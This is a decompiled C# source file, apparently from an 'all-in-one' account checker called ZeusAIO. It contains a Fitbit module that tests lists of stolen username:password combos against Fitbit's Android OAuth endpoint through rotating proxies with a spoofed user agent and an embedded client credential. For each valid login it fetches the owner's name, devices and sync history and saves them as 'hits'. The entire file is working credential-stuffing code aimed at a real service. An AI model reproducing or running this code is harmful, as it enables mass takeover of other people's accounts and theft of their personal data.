// Decompiled with JetBrains decompiler
// Type: Fitbit.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Fitbit
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < mainmenu.globalRetries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "username=" + s[0] + "&password=" + s[1] + "&scope=activity heartrate location nutrition profile settings sleep social weight mfa_ok&grant_type=password";
              httpRequest.AddHeader("Authorization", "Basic MjI4VlNSOjQ1MDY4YTc2Mzc0MDRmYzc5OGEyMDhkNmMxZjI5ZTRm");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source1 = httpRequest.Post("https://android-api.fitbit.com/oauth2/token?session-data={\"os-name\":\"Android\",\"os-version\":\"5.1.1\",\"device-model\":\"LGM-V300K\",\"device-manufacturer\":\"LGE\",\"device-name\":\"\"}", str1, "application/x-www-form-urlencoded").ToString();
              if (source1.Contains("deviceVersion"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - FITBIT] " + s[0] + s[1], Color.Green);
                Export.AsResult("/Fitbit_hits", s[0] + ":" + s[1]);
                return false;
              }
              if (!source1.Contains("Invalid username/password") && !source1.Contains("Missing parameters") && !source1.Contains("plan\":\"\""))
              {
                if (source1.Contains("access_token"))
                {
                  httpRequest.ClearAllHeaders();
                  string str2 = Check.Parse(source1, "access_token\":\"", "\"");
                  string str3 = Check.Parse(source1, "user_id\":\"", "\"");
                  httpRequest.AddHeader("Authorization", "Bearer " + str2);
                  string source2 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + str3 + "/devices.json?").ToString();
                  if (!source2.Contains("[]") && source2.Contains("deviceVersion"))
                  {
                    string str4 = Check.Parse(source2, "deviceVersion\":\"", "\"");
                    string str5 = Check.Parse(source2, "lastSyncTime\":\"", "\"");
                    httpRequest.AddHeader("Authorization", "Bearer " + str2);
                    string source3 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + str3 + "/profile.json").ToString();
                    if (source3.Contains("fullName\":\""))
                    {
                      string str6 = Check.Parse(source3, "fullName\":\"", "\"");
                      string str7 = Check.Parse(source3, "memberSince\":\"", "\"");
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - FITBIT] " + s[0] + ":" + s[1] + " | Name: " + str6 + " | Member Since: " + str7 + " | Last Sync Time: " + str5 + " | Device: " + str4, Color.Green);
                      Export.AsResult("/Fitbit_hits", s[0] + ":" + s[1] + " | Name: " + str6 + " | Member Since: " + str7 + " | Last Sync Time: " + str5 + " | Device: " + str4);
                      return false;
                    }
                  }
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
